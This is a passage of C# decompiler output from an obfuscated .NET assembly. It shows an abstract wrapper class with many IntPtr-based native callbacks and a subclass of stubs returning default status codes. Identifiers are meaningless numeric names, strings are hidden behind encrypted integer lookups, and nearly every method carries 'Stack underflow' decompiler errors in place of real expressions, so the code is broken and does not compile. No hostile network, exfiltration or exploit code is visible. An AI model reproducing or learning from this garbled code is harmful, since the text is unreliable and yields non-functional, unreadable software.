			if ((int)/*Error near IL_0004: Stack underflow*/ == 0 || ((global::_0014._0018)/*Error near IL_000b: Stack underflow*/)._0001 == null)
			{
				return false;
			}
			((global::_0014._0018)/*Error near IL_0016: Stack underflow*/)._0001._0001 = _0003;
			return true;
		}

		protected virtual bool _0001(global::_0014._0018 _0002)
		{
			//IL_0015: Incompatible stack heights: 0 vs 1
			//IL_0018: Incompatible stack heights: 0 vs 1
			//IL_001b: Incompatible stack heights: 0 vs 1
			double? num = null;
			return ((_0082)/*Error near IL_0013: Stack underflow*/)._0001((global::_0014._0018)/*Error near IL_0013: Stack underflow*/, (double?)/*Error near IL_0013: Stack underflow*/);
		}

		protected virtual bool _0001(global::_0014._0018 _0002, long? _0003)
		{
			//IL_001f: Incompatible stack heights: 0 vs 1
			//IL_0022: Incompatible stack heights: 0 vs 1
			//IL_0025: Incompatible stack heights: 0 vs 1
			if ((int)/*Error near IL_0004: Stack underflow*/ == 0 || ((global::_0014._0018)/*Error near IL_000b: Stack underflow*/)._0001 == null)
			{
				return false;
			}
			((global::_0014._0018)/*Error near IL_0016: Stack underflow*/)._0001._0001 = _0003;
			return true;
		}

		protected virtual bool _0002(global::_0014._0018 _0002)
		{
			//IL_0015: Incompatible stack heights: 0 vs 1
			//IL_0018: Incompatible stack heights: 0 vs 1
			//IL_001b: Incompatible stack heights: 0 vs 1
			long? num = null;
			return ((_0082)/*Error near IL_0013: Stack underflow*/)._0001((global::_0014._0018)/*Error near IL_0013: Stack underflow*/, (long?)/*Error near IL_0013: Stack underflow*/);
		}

		protected virtual bool _0001(global::_0014._0018 _0002, global::_001A._0019? _0003)
		{
			//IL_001f: Incompatible stack heights: 0 vs 1
			//IL_0022: Incompatible stack heights: 0 vs 1
			//IL_0025: Incompatible stack heights: 0 vs 1
			if ((int)/*Error near IL_0004: Stack underflow*/ == 0 || ((global::_0014._0018)/*Error near IL_000b: Stack underflow*/)._0001 == null)
			{
				return false;
			}
			((global::_0014._0018)/*Error near IL_0016: Stack underflow*/)._0001._0001 = _0003;
			return true;
		}

		protected virtual bool _0003(global::_0014._0018 _0002)
		{
			//IL_0015: Incompatible stack heights: 0 vs 1
			//IL_0018: Incompatible stack heights: 0 vs 1
			//IL_001b: Incompatible stack heights: 0 vs 1
			global::_001A._0019? obj = null;
			return ((_0082)/*Error near IL_0013: Stack underflow*/)._0001((global::_0014._0018)/*Error near IL_0013: Stack underflow*/, (global::_001A._0019?)/*Error near IL_0013: Stack underflow*/);
		}

		internal global::_0080._0017 _0001(IntPtr _0002, IntPtr _0003, int _0004, IntPtr _0005, ref IntPtr _0006, ref IntPtr _0007)
		{
			//IL_0015: Incompatible stack heights: 0 vs 1
			//IL_0018: Incompatible stack heights: 0 vs 2
			//IL_001b: Incompatible stack heights: 0 vs 1
			_ = 1;
			return ((_0082)/*Error near IL_0013: Stack underflow*/)._0001((byte)/*Error near IL_0013: Stack underflow*/ != 0, (IntPtr)/*Error near IL_0013: Stack underflow*/, (IntPtr)/*Error near IL_0013: Stack underflow*/, _0004, _0005, ref _0006, ref _0007);
		}

		internal global::_0080._0017 _0002(IntPtr _0002, IntPtr _0003, int _0004, IntPtr _0005, ref IntPtr _0006, ref IntPtr _0007)
		{
			//IL_0015: Incompatible stack heights: 0 vs 1
			//IL_0018: Incompatible stack heights: 0 vs 2
			//IL_001b: Incompatible stack heights: 0 vs 1
			_ = 0;
			return ((_0082)/*Error near IL_0013: Stack underflow*/)._0001((byte)/*Error near IL_0013: Stack underflow*/ != 0, (IntPtr)/*Error near IL_0013: Stack underflow*/, (IntPtr)/*Error near IL_0013: Stack underflow*/, _0004, _0005, ref _0006, ref _0007);
		}

		internal global::_0080._0017 _0001(IntPtr _0002, IntPtr _0003)
		{
			//IL_002e: Incompatible stack heights: 0 vs 1
			//IL_0031: Incompatible stack heights: 0 vs 1
			//IL_0038: Incompatible stack heights: 0 vs 1
			try
			{
				((_0082)/*Error near IL_0038: Stack underflow*/)._0001((IntPtr)/*Error near IL_0038: Stack underflow*/);
				_0081 obj = (_0081)/*Error near IL_0007: Stack underflow*/;
				if (obj != null)
				{
					global::_0014._0018 obj2 = null;
					global::_0011._0018._0001(_0002: true, _0003, ref obj2);
					if (_0001(obj, obj2) == global::_0080._0017._0002)
					{
						global::_0011._0018._0001(_0002: true, obj2, _0003);
						return global::_0080._0017._0002;
					}
				}
			}
			catch (Exception ex)
			{
				_0001(_0002, global::_0002._007E_0006(ex));
			}
			return global::_0080._0017._0003;
		}

		internal global::_0080._0017 _0001(IntPtr _0002)
		{
			//IL_0009: Incompatible stack heights: 0 vs 1
			//IL_000c: Incompatible stack heights: 0 vs 2
			//IL_0013: Incompatible stack heights: 0 vs 1
			_ = 0;
			((_0082)/*Error near IL_0013: Stack underflow*/)._0001((byte)/*Error near IL_0013: Stack underflow*/ != 0, (IntPtr)/*Error near IL_0013: Stack underflow*/);
			return (global::_0080._0017)/*Error near IL_0008: Stack underflow*/;
		}

		internal global::_0080._0017 _0002(IntPtr _0002)
		{
			//IL_0009: Incompatible stack heights: 0 vs 1
			//IL_000c: Incompatible stack heights: 0 vs 2
			//IL_0013: Incompatible stack heights: 0 vs 1
			_ = 1;
			((_0082)/*Error near IL_0013: Stack underflow*/)._0001((byte)/*Error near IL_0013: Stack underflow*/ != 0, (IntPtr)/*Error near IL_0013: Stack underflow*/);
			return (global::_0080._0017)/*Error near IL_0008: Stack underflow*/;
		}

		internal global::_0080._0017 _0001(IntPtr _0002, ref IntPtr _0003)
		{
			//IL_0071: Incompatible stack heights: 0 vs 1
			//IL_0077: Incompatible stack heights: 0 vs 1
			//IL_0081: Incompatible stack heights: 0 vs 1
			try
			{
				((_0082)/*Error near IL_0081: Stack underflow*/)._0001((IntPtr)/*Error near IL_0081: Stack underflow*/);
				_0081 obj = (_0081)/*Error near IL_000d: Stack underflow*/;
				if (obj != null)
				{
					global::_0017._0086 obj2 = null;
					if (_0001(obj, ref obj2) == global::_0080._0017._0002)
					{
						if (obj2 != null)
						{
							_0003 = this._0001(obj2);
							if (_0090_0002._0099_0005(_0003, IntPtr.Zero))
							{
								return global::_0080._0017._0002;
							}
							_0001(_0002, global::_0080._0014._0001(107375046));
						}
						else
						{
							_0001(_0002, global::_0080._0014._0001(107375037));
						}
					}
				}
			}
			catch (Exception ex)
			{
				_0001(_0002, global::_0002._007E_0006(ex));
			}
			return global::_0080._0017._0003;
		}

		internal global::_0080._0017 _0003(IntPtr _0002)
		{
			//IL_0042: Incompatible stack heights: 0 vs 1
			//IL_0045: Incompatible stack heights: 0 vs 1
			IntPtr intPtr = IntPtr.Zero;
			try
			{
				intPtr = ((_0082)/*Error near IL_0010: Stack underflow*/)._0001((IntPtr)/*Error near IL_0010: Stack underflow*/);
				global::_0017._0086 obj = this._0001(intPtr, _0002);
				if (obj != null && this._0001(obj) == global::_0080._0017._0002)
				{
					if (this.m__0001 != null)
					{
						this.m__0001.Remove(_0002);
					}
					return global::_0080._0017._0002;
				}
			}
			catch (Exception ex)
			{
				_0001(intPtr, global::_0002._007E_0006(ex));
			}
			finally
			{
				this._0004(_0002);
			}
			return global::_0080._0017._0003;
		}

		internal global::_0080._0017 _0001(IntPtr _0002, int _0003, IntPtr _0004, int _0005, IntPtr _0006)
		{
			//IL_003d: Incompatible stack heights: 0 vs 1
			//IL_0040: Incompatible stack heights: 0 vs 1
			IntPtr intPtr = IntPtr.Zero;
			try
			{
				intPtr = ((_0082)/*Error near IL_0010: Stack underflow*/)._0001((IntPtr)/*Error near IL_0010: Stack underflow*/);
				global::_0017._0086 obj = this._0001(intPtr, _0002);
				if (obj != null && _0001(obj, _0003, global::_0011._0018._0001(_0004), global::_0011._0018._0001(_0005, _0006)) == global::_0080._0017._0002)
				{
					return global::_0080._0017._0002;
				}
			}
			catch (Exception ex)
			{
				_0001(intPtr, global::_0002._007E_0006(ex));
			}
			return global::_0080._0017._0003;
		}

		internal global::_0080._0017 _0004(IntPtr _0002)
		{
			//IL_002d: Incompatible stack heights: 0 vs 1
			//IL_0030: Incompatible stack heights: 0 vs 1
			IntPtr intPtr = IntPtr.Zero;
			try
			{
				intPtr = ((_0082)/*Error near IL_0010: Stack underflow*/)._0001((IntPtr)/*Error near IL_0010: Stack underflow*/);
				global::_0017._0086 obj = this._0001(intPtr, _0002);
				if (obj != null && this._0002(obj) == global::_0080._0017._0002)
				{
					return global::_0080._0017._0002;
				}
			}
			catch (Exception ex)
			{
				_0001(intPtr, global::_0002._007E_0006(ex));
			}
			return global::_0080._0017._0003;
		}

		internal int _0001(IntPtr _0002)
		{
			//IL_0030: Incompatible stack heights: 0 vs 1
			//IL_0033: Incompatible stack heights: 0 vs 1
			IntPtr intPtr = IntPtr.Zero;
			try
			{
				intPtr = ((_0082)/*Error near IL_0010: Stack underflow*/)._0001((IntPtr)/*Error near IL_0010: Stack underflow*/);
				global::_0017._0086 obj = this._0001(intPtr, _0002);
				if (obj != null)
				{
					return this._0001(obj) ? 1 : 0;
				}
			}
			catch (Exception ex)
			{
				_0001(intPtr, global::_0002._007E_0006(ex));
			}
			return 1;
		}

		internal global::_0080._0017 _0001(IntPtr _0002, IntPtr _0003, int _0004)
		{
			//IL_0036: Incompatible stack heights: 0 vs 1
			//IL_0039: Incompatible stack heights: 0 vs 1
			IntPtr zero = IntPtr.Zero;
			IntPtr intPtr = default(IntPtr);
			if (0 == 0)
			{
				intPtr = zero;
			}
			try
			{
				intPtr = ((_0082)/*Error near IL_0012: Stack underflow*/)._0001((IntPtr)/*Error near IL_0012: Stack underflow*/);
				global::_0017._0086 obj = this._0001(intPtr, _0002);
				if (obj != null)
				{
					_007F obj2 = new _007F(_0003);
					return _0001(obj, obj2, _0004);
				}
			}
			catch (Exception ex)
			{
				_0001(intPtr, global::_0002._007E_0006(ex));
			}
			return global::_0080._0017._0003;
		}

		internal global::_0080._0017 _0001(IntPtr _0002, ref long _0003)
		{
			//IL_002b: Incompatible stack heights: 0 vs 1
			//IL_002e: Incompatible stack heights: 0 vs 1
			IntPtr intPtr = IntPtr.Zero;
			try
			{
				intPtr = ((_0082)/*Error near IL_0010: Stack underflow*/)._0001((IntPtr)/*Error near IL_0010: Stack underflow*/);
				global::_0017._0086 obj = this._0001(intPtr, _0002);
				if (obj != null)
				{
					return _0001(obj, ref _0003);
				}
			}
			catch (Exception ex)
			{
				_0001(intPtr, global::_0002._007E_0006(ex));
			}
			return global::_0080._0017._0003;
		}

		internal global::_0080._0017 _0001(IntPtr _0002, int _0003, IntPtr _0004, ref long _0005)
		{
			//IL_0020: Incompatible stack heights: 0 vs 1
			//IL_0023: Incompatible stack heights: 0 vs 1
			//IL_002a: Incompatible stack heights: 0 vs 1
			try
			{
				((_0082)/*Error near IL_002a: Stack underflow*/)._0001((IntPtr)/*Error near IL_002a: Stack underflow*/);
				_0081 obj = (_0081)/*Error near IL_0007: Stack underflow*/;
				if (obj != null)
				{
					return _0001(obj, global::_0011._0018._0001(_0003, _0004), ref _0005);
				}
			}
			catch (Exception ex)
			{
				_0001(_0002, global::_0002._007E_0006(ex));
			}
			return global::_0080._0017._0003;
		}

		internal global::_0080._0017 _0005(IntPtr _0002)
		{
			//IL_0017: Incompatible stack heights: 0 vs 1
			//IL_001a: Incompatible stack heights: 0 vs 1
			//IL_0021: Incompatible stack heights: 0 vs 1
			try
			{
				((_0082)/*Error near IL_0021: Stack underflow*/)._0001((IntPtr)/*Error near IL_0021: Stack underflow*/);
				_0081 obj = (_0081)/*Error near IL_0007: Stack underflow*/;
				if (obj != null)
				{
					return _0003(obj);
				}
			}
			catch (Exception ex)
			{
				_0001(_0002, global::_0002._007E_0006(ex));
			}
			return global::_0080._0017._0003;
		}

		internal global::_0080._0017 _0006(IntPtr _0002)
		{
			//IL_0017: Incompatible stack heights: 0 vs 1
			//IL_001a: Incompatible stack heights: 0 vs 1
			//IL_0021: Incompatible stack heights: 0 vs 1
			try
			{
				((_0082)/*Error near IL_0021: Stack underflow*/)._0001((IntPtr)/*Error near IL_0021: Stack underflow*/);
				_0081 obj = (_0081)/*Error near IL_0007: Stack underflow*/;
				if (obj != null)
				{
					return _0004(obj);
				}
			}
			catch (Exception ex)
			{
				_0001(_0002, global::_0002._007E_0006(ex));
			}
			return global::_0080._0017._0003;
		}

		internal global::_0080._0017 _0007(IntPtr _0002)
		{
			//IL_0017: Incompatible stack heights: 0 vs 1
			//IL_001a: Incompatible stack heights: 0 vs 1
			//IL_0021: Incompatible stack heights: 0 vs 1
			try
			{
				((_0082)/*Error near IL_0021: Stack underflow*/)._0001((IntPtr)/*Error near IL_0021: Stack underflow*/);
				_0081 obj = (_0081)/*Error near IL_0007: Stack underflow*/;
				if (obj != null)
				{
					return _0005(obj);
				}
			}
			catch (Exception ex)
			{
				_0001(_0002, global::_0002._007E_0006(ex));
			}
			return global::_0080._0017._0003;
		}

		internal global::_0080._0017 _0008(IntPtr _0002)
		{
			//IL_0017: Incompatible stack heights: 0 vs 1
			//IL_001a: Incompatible stack heights: 0 vs 1
			//IL_0021: Incompatible stack heights: 0 vs 1
			try
			{
				((_0082)/*Error near IL_0021: Stack underflow*/)._0001((IntPtr)/*Error near IL_0021: Stack underflow*/);
				_0081 obj = (_0081)/*Error near IL_0007: Stack underflow*/;
				if (obj != null)
				{
					return _0006(obj);
				}
			}
			catch (Exception ex)
			{
				_0001(_0002, global::_0002._007E_0006(ex));
			}
			return global::_0080._0017._0003;
		}

		internal int _0001(IntPtr _0002, int _0003, IntPtr _0004, ref global::_0019._001F _0005, ref IntPtr _0006)
		{
			//IL_0065: Incompatible stack heights: 0 vs 1
			//IL_0068: Incompatible stack heights: 0 vs 1
			//IL_006f: Incompatible stack heights: 0 vs 1
			try
			{
				((_0082)/*Error near IL_006f: Stack underflow*/)._0001((IntPtr)/*Error near IL_006f: Stack underflow*/);
				_0081 obj = (_0081)/*Error near IL_0007: Stack underflow*/;
				if (obj != null)
				{
					string text = global::_0011._0018._0001(_0004);
					global::_0012._0014 obj2 = null;
					if (_0001(obj, _0003, text, ref obj2, ref _0006))
					{
						if (obj2 != null)
						{
							string key = _0001(_0003, text, obj2);
							this.m__0001[key] = obj2;
							_0005 = obj2._0001;
							return 1;
						}
						_0001(_0002, global::_0080._0014._0001(107374996));
					}
				}
			}
			catch (Exception ex)
			{
				_0001(_0002, global::_0002._007E_0006(ex));
			}
			return 0;
		}

		internal global::_0080._0017 _0002(IntPtr _0002, IntPtr _0003)
		{
			//IL_001d: Incompatible stack heights: 0 vs 1
			//IL_0020: Incompatible stack heights: 0 vs 1
			//IL_0027: Incompatible stack heights: 0 vs 1
			try
			{
				((_0082)/*Error near IL_0027: Stack underflow*/)._0001((IntPtr)/*Error near IL_0027: Stack underflow*/);
				_0081 obj = (_0081)/*Error near IL_0007: Stack underflow*/;
				if (obj != null)
				{
					return this._0001(obj, global::_0011._0018._0001(_0003));
				}
			}
			catch (Exception ex)
			{
				_0001(_0002, global::_0002._007E_0006(ex));
			}
			return global::_0080._0017._0003;
		}

		internal global::_0080._0017 _0001(IntPtr _0002, int _0003)
		{
			//IL_0018: Incompatible stack heights: 0 vs 1
			//IL_001b: Incompatible stack heights: 0 vs 1
			//IL_0022: Incompatible stack heights: 0 vs 1
			try
			{
				((_0082)/*Error near IL_0022: Stack underflow*/)._0001((IntPtr)/*Error near IL_0022: Stack underflow*/);
				_0081 obj = (_0081)/*Error near IL_0007: Stack underflow*/;
				if (obj != null)
				{
					return _0001(obj, _0003);
				}
			}
			catch (Exception ex)
			{
				_0001(_0002, global::_0002._007E_0006(ex));
			}
			return global::_0080._0017._0003;
		}

		internal global::_0080._0017 _0002(IntPtr _0002, int _0003)
		{
			//IL_0018: Incompatible stack heights: 0 vs 1
			//IL_001b: Incompatible stack heights: 0 vs 1
			//IL_0022: Incompatible stack heights: 0 vs 1
			try
			{
				((_0082)/*Error near IL_0022: Stack underflow*/)._0001((IntPtr)/*Error near IL_0022: Stack underflow*/);
				_0081 obj = (_0081)/*Error near IL_0007: Stack underflow*/;
				if (obj != null)
				{
					return this._0002(obj, _0003);
				}
			}
			catch (Exception ex)
			{
				_0001(_0002, global::_0002._007E_0006(ex));
			}
			return global::_0080._0017._0003;
		}

		internal global::_0080._0017 _0003(IntPtr _0002, int _0003)
		{
			//IL_0018: Incompatible stack heights: 0 vs 1
			//IL_001b: Incompatible stack heights: 0 vs 1
			//IL_0022: Incompatible stack heights: 0 vs 1
			try
			{
				((_0082)/*Error near IL_0022: Stack underflow*/)._0001((IntPtr)/*Error near IL_0022: Stack underflow*/);
				_0081 obj = (_0081)/*Error near IL_0007: Stack underflow*/;
				if (obj != null)
				{
					return this._0003(obj, _0003);
				}
			}
			catch (Exception ex)
			{
				_0001(_0002, global::_0002._007E_0006(ex));
			}
			return global::_0080._0017._0003;
		}

		public abstract global::_0080._0017 _0001(global::_0017._0080 _0002, IntPtr _0003, string[] _0004, ref _0081 _0005, ref string _0006);

		public abstract global::_0080._0017 _0002(global::_0017._0080 _0002, IntPtr _0003, string[] _0004, ref _0081 _0005, ref string _0006);

		public abstract global::_0080._0017 _0001(_0081 _0002, global::_0014._0018 _0003);

		public abstract global::_0080._0017 _0001(_0081 _0002);

		public abstract global::_0080._0017 _0002(_0081 _0002);

		public abstract global::_0080._0017 _0001(_0081 _0002, ref global::_0017._0086 _0003);

		public abstract global::_0080._0017 _0001(global::_0017._0086 _0002);

		public abstract global::_0080._0017 _0001(global::_0017._0086 _0002, int _0003, string _0004, global::_001A._0018[] _0005);

		public abstract global::_0080._0017 _0002(global::_0017._0086 _0002);

		public abstract bool _0001(global::_0017._0086 _0002);

		public abstract global::_0080._0017 _0001(global::_0017._0086 _0002, _007F _0003, int _0004);

		public abstract global::_0080._0017 _0001(global::_0017._0086 _0002, ref long _0003);

		public abstract global::_0080._0017 _0001(_0081 _0002, global::_001A._0018[] _0003, ref long _0004);

		public abstract global::_0080._0017 _0003(_0081 _0002);

		public abstract global::_0080._0017 _0004(_0081 _0002);

		public abstract global::_0080._0017 _0005(_0081 _0002);

		public abstract global::_0080._0017 _0006(_0081 _0002);

		public abstract bool _0001(_0081 _0002, int _0003, string _0004, ref global::_0012._0014 _0005, ref IntPtr _0006);

		public abstract global::_0080._0017 _0001(_0081 _0002, string _0003);

		public abstract global::_0080._0017 _0001(_0081 _0002, int _0003);

		public abstract global::_0080._0017 _0002(_0081 _0002, int _0003);

		public abstract global::_0080._0017 _0003(_0081 _0002, int _0003);

		public void _0001()
		{
			//IL_0013: Incompatible stack heights: 0 vs 1
			//IL_001d: Incompatible stack heights: 0 vs 2
			((_0082)/*Error near IL_001a: Stack underflow*/)._0001(_0002: true);
			_ = _0091_0002._009B_0005;
			/*Error near IL_0011: Stack underflow*/((object)/*Error near IL_0011: Stack underflow*/);
		}

		void IDisposable.Dispose()
		{
			//ILSpy generated this explicit interface implementation from .override directive in 
			this._0001();
		}

		protected virtual void _0001(bool _0002)
		{
			//IL_00a4: Incompatible stack heights: 0 vs 1
			//IL_00aa: Incompatible stack heights: 0 vs 1
			//IL_00b0: Incompatible stack heights: 0 vs 1
			if (((_0082)/*Error near IL_000a: Stack underflow*/)._0004)
			{
				return;
			}
			if ((int)/*Error near IL_0016: Stack underflow*/ != 0 && ((_0082)/*Error near IL_0020: Stack underflow*/).m__0001 != null)
			{
				this.m__0001.Clear();
			}
			try
			{
				if (_0090_0002._0099_0005(this._0001, IntPtr.Zero))
				{
					global::_0011._0018._0001(this._0001);
					this._0001 = IntPtr.Zero;
				}
			}
			catch (Exception ex)
			{
				try
				{
					if (LogExceptionsNoThrow)
					{
						global::_0011._0018._0001(-2146233088, global::_0011._0018._0001((IFormatProvider)_008F_0003._008C_0007(), global::_0080._0014._0001(107374963), new object[1] { ex }));
					}
				}
				catch
				{
				}
			}
			this._0004 = true;
		}

		~_0082()
		{
			//IL_0008: Incompatible stack heights: 0 vs 1
			try
			{
				((_0082)/*Error near IL_000f: Stack underflow*/)._0001(_0002: false);
			}
			finally
			{
				global::_0008._009E(this);
			}
		}
	}
}
namespace _0004
{
	internal class _001A : global::_0001._0082
	{
		private new Dictionary<string, _0080._0017> m__0001;

		internal new bool _0001;

		public _001A(string _0004_001F)
			: base(_0004_001F)
		{
			this.m__0001 = new Dictionary<string, _0080._0017>();
		}

		protected new virtual _0080._0017 _0001()
		{
			return _0080._0017._0002;
		}

		protected new virtual bool _0001(_0080._0017 _0002)
		{
			//IL_0009: Incompatible stack heights: 0 vs 1
			if ((int)/*Error near IL_0004: Stack underflow*/ != 0)
			{
				return true;
			}
			return false;
		}

		protected virtual bool _0002(_0080._0017 _0002)
		{
			//IL_0009: Incompatible stack heights: 0 vs 1
			if ((int)/*Error near IL_0004: Stack underflow*/ != 0)
			{
				return false;
			}
			return true;
		}

		protected new virtual _0080._0017 _0001(string _0002)
		{
			//IL_0037: Incompatible stack heights: 0 vs 1
			//IL_003a: Incompatible stack heights: 0 vs 1
			//IL_003d: Incompatible stack heights: 0 vs 1
			if ((int)/*Error near IL_0004: Stack underflow*/ == 0 || ((_001A)/*Error near IL_000b: Stack underflow*/).m__0001 == null)
			{
				return ((_001A)/*Error near IL_0014: Stack underflow*/)._0001();
			}
			if (this.m__0001 != null && this.m__0001.TryGetValue(_0002, out var value))
			{
				return value;
			}
			return _0001();
		}

		protected new virtual bool _0001(string _0002, _0080._0017 _0003)
		{
			//IL_0020: Incompatible stack heights: 0 vs 1
			//IL_0023: Incompatible stack heights: 0 vs 1
			//IL_0026: Incompatible stack heights: 0 vs 1
			if ((int)/*Error near IL_0004: Stack underflow*/ == 0 || ((_001A)/*Error near IL_000b: Stack underflow*/).m__0001 == null)
			{
				return false;
			}
			((_001A)/*Error near IL_0016: Stack underflow*/).m__0001[_0002] = _0003;
			return true;
		}

		public override _0080._0017 _0001(global::_0017._0080 _0002, IntPtr _0003, string[] _0004, ref global::_0001._0081 _0005, ref string _0006)
		{
			//IL_0017: Incompatible stack heights: 0 vs 1
			//IL_0021: Incompatible stack heights: 0 vs 1
			global::_0011._0018._0001((_001A)/*Error near IL_001e: Stack underflow*/);
			string text = _0080._0014._0001(107374906);
			return ((_001A)/*Error near IL_0015: Stack underflow*/)._0001(text);
		}

		public override _0080._0017 _0002(global::_0017._0080 _0002, IntPtr _0003, string[] _0004, ref global::_0001._0081 _0005, ref string _0006)
		{
			//IL_0017: Incompatible stack heights: 0 vs 1
			//IL_0021: Incompatible stack heights: 0 vs 1
			global::_0011._0018._0001((_001A)/*Error near IL_001e: Stack underflow*/);
			string text = _0080._0014._0001(107374897);
			return ((_001A)/*Error near IL_0015: Stack underflow*/)._0001(text);
		}

		public override _0080._0017 _0001(global::_0001._0081 _0002, global::_0014._0018 _0003)
		{
			//IL_0017: Incompatible stack heights: 0 vs 1
			//IL_0021: Incompatible stack heights: 0 vs 1
			global::_0011._0018._0001((_001A)/*Error near IL_001e: Stack underflow*/);
			string text = _0080._0014._0001(107374852);
			return ((_001A)/*Error near IL_0015: Stack underflow*/)._0001(text);
		}

		public override _0080._0017 _0001(global::_0001._0081 _0002)
		{
			//IL_0017: Incompatible stack heights: 0 vs 1
			//IL_0021: Incompatible stack heights: 0 vs 1
			global::_0011._0018._0001((_001A)/*Error near IL_001e: Stack underflow*/);
			string text = _0080._0014._0001(107374871);
			return ((_001A)/*Error near IL_0015: Stack underflow*/)._0001(text);
		}

		public override _0080._0017 _0002(global::_0001._0081 _0002)
		{
			//IL_0017: Incompatible stack heights: 0 vs 1
			//IL_0021: Incompatible stack heights: 0 vs 1
			global::_0011._0018._0001((_001A)/*Error near IL_001e: Stack underflow*/);
			string text = _0080._0014._0001(107374310);
			return ((_001A)/*Error near IL_0015: Stack underflow*/)._0001(text);
		}

		public override _0080._0017 _0001(global::_0001._0081 _0002, ref global::_0017._0086 _0003)
		{
			//IL_0017: Incompatible stack heights: 0 vs 1
			//IL_0021: Incompatible stack heights: 0 vs 1
			global::_0011._0018._0001((_001A)/*Error near IL_001e: Stack underflow*/);
			string text = _0080._0014._0001(107374329);
			return ((_001A)/*Error near IL_0015: Stack underflow*/)._0001(text);
		}

		public override _0080._0017 _0001(global::_0017._0086 _0002)
		{
			//IL_0017: Incompatible stack heights: 0 vs 1
			//IL_0021: Incompatible stack heights: 0 vs 1
			global::_0011._0018._0001((_001A)/*Error near IL_001e: Stack underflow*/);
			string text = _0080._0014._0001(107374320);
			return ((_001A)/*Error near IL_0015: Stack underflow*/)._0001(text);
		}

		public override _0080._0017 _0001(global::_0017._0086 _0002, int _0003, string _0004, global::_001A._0018[] _0005)
		{
			//IL_0017: Incompatible stack heights: 0 vs 1
			//IL_0021: Incompatible stack heights: 0 vs 1
			global::_0011._0018._0001((_001A)/*Error near IL_001e: Stack underflow*/);
			string text = _0080._0014._0001(107374279);
			return ((_001A)/*Error near IL_0015: Stack underflow*/)._0001(text);
		}

		public override _0080._0017 _0002(global::_0017._0086 _0002)
		{
			//IL_0017: Incompatible stack heights: 0 vs 1
			//IL_0021: Incompatible stack heights: 0 vs 1
			global::_0011._0018._0001((_001A)/*Error near IL_001e: Stack underflow*/);
			string text = _0080._0014._0001(107374302);
			return ((_001A)/*Error near IL_0015: Stack underflow*/)._0001(text);
		}

		public override bool _0001(global::_0017._0086 _0002)
		{
			//IL_001d: Incompatible stack heights: 0 vs 1
			//IL_0027: Incompatible stack heights: 0 vs 1
			global::_0011._0018._0001((_001A)/*Error near IL_0024: Stack underflow*/);
			_0080._0017 num = _0001(_0080._0014._0001(107374293));
			return ((_001A)/*Error near IL_001b: Stack underflow*/)._0001(num);
		}

		public override _0080._0017 _0001(global::_0017._0086 _0002, global::_0001._007F _0003, int _0004)
		{
			//IL_0017: Incompatible stack heights: 0 vs 1
			//IL_0021: Incompatible stack heights: 0 vs 1
			global::_0011._0018._0001((_001A)/*Error near IL_001e: Stack underflow*/);
			string text = _0080._0014._0001(107374288);
			return ((_001A)/*Error near IL_0015: Stack underflow*/)._0001(text);
		}

		public override _0080._0017 _0001(global::_0017._0086 _0002, ref long _0003)
		{
			//IL_0017: Incompatible stack heights: 0 vs 1
			//IL_0021: Incompatible stack heights: 0 vs 1
			global::_0011._0018._0001((_001A)/*Error near IL_001e: Stack underflow*/);
			string text = _0080._0014._0001(107374247);
			return ((_001A)/*Error near IL_0015: Stack underflow*/)._0001(text);
		}

		public override _0080._0017 _0001(global::_0001._0081 _0002, global::_001A._0018[] _0003, ref long _0004)
		{
			//IL_0017: Incompatible stack heights: 0 vs 1
			//IL_0021: Incompatible stack heights: 0 vs 1
			global::_0011._0018._0001((_001A)/*Error near IL_001e: Stack underflow*/);
			string text = _0080._0014._0001(107374270);
			return ((_001A)/*Error near IL_0015: Stack underflow*/)._0001(text);
		}

		public override _0080._0017 _0003(global::_0001._0081 _0002)
		{
			//IL_0017: Incompatible stack heights: 0 vs 1
			//IL_0021: Incompatible stack heights: 0 vs 1
			global::_0011._0018._0001((_001A)/*Error near IL_001e: Stack underflow*/);
			string text = _0080._0014._0001(107374261);
			return ((_001A)/*Error near IL_0015: Stack underflow*/)._0001(text);
		}

		public override _0080._0017 _0004(global::_0001._0081 _0002)
		{
			//IL_0017: Incompatible stack heights: 0 vs 1
			//IL_0021: Incompatible stack heights: 0 vs 1
			global::_0011._0018._0001((_001A)/*Error near IL_001e: Stack underflow*/);
			string text = _0080._0014._0001(107374220);
			return ((_001A)/*Error near IL_0015: Stack underflow*/)._0001(text);
		}

		public override _0080._0017 _0005(global::_0001._0081 _0002)
		{
			//IL_0017: Incompatible stack heights: 0 vs 1
			//IL_0021: Incompatible stack heights: 0 vs 1
			global::_0011._0018._0001((_001A)/*Error near IL_001e: Stack underflow*/);
			string text = _0080._0014._0001(107374211);
			return ((_001A)/*Error near IL_0015: Stack underflow*/)._0001(text);
		}

		public override _0080._0017 _0006(global::_0001._0081 _0002)
		{
			//IL_0017: Incompatible stack heights: 0 vs 1
			//IL_0021: Incompatible stack heights: 0 vs 1
			global::_0011._0018._0001((_001A)/*Error near IL_001e: Stack underflow*/);
			string text = _0080._0014._0001(107374234);
			return ((_001A)/*Error near IL_0015: Stack underflow*/)._0001(text);
		}

		public override bool _0001(global::_0001._0081 _0002, int _0003, string _0004, ref global::_0012._0014 _0005, ref IntPtr _0006)
		{
			//IL_001d: Incompatible stack heights: 0 vs 1
			//IL_0027: Incompatible stack heights: 0 vs 1
			global::_0011._0018._0001((_001A)/*Error near IL_0024: Stack underflow*/);
			_0080._0017 num = _0001(_0080._0014._0001(107374189));
			return ((_001A)/*Error near IL_001b: Stack underflow*/)._0002(num);
		}

		public override _0080._0017 _0001(global::_0001._0081 _0002, string _0003)
		{
			//IL_0017: Incompatible stack heights: 0 vs 1
			//IL_0021: Incompatible stack heights: 0 vs 1
			global::_0011._0018._0001((_001A)/*Error near IL_001e: Stack underflow*/);
			string text = _0080._0014._0001(107374204);
			return ((_001A)/*Error near IL_0015: Stack underflow*/)._0001(text);
		}

		public override _0080._0017 _0001(global::_0001._0081 _0002, int _0003)
		{
			//IL_0017: Incompatible stack heights: 0 vs 1
			//IL_0021: Incompatible stack heights: 0 vs 1
			global::_0011._0018._0001((_001A)/*Error near IL_001e: Stack underflow*/);
			string text = _0080._0014._0001(107374195);
			return ((_001A)/*Error near IL_0015: Stack underflow*/)._0001(text);
		}

		public override _0080._0017 _0002(global::_0001._0081 _0002, int _0003)
		{
			//IL_0017: Incompatible stack heights: 0 vs 1
			//IL_0021: Incompatible stack heights: 0 vs 1
			global::_0011._0018._0001((_001A)/*Error near IL_001e: Stack underflow*/);
			string text = _0080._0014._0001(107374150);
			return ((_001A)/*Error near IL_0015: Stack underflow*/)._0001(text);
		}

		public override _0080._0017 _0003(global::_0001._0081 _0002, int _0003)
		{
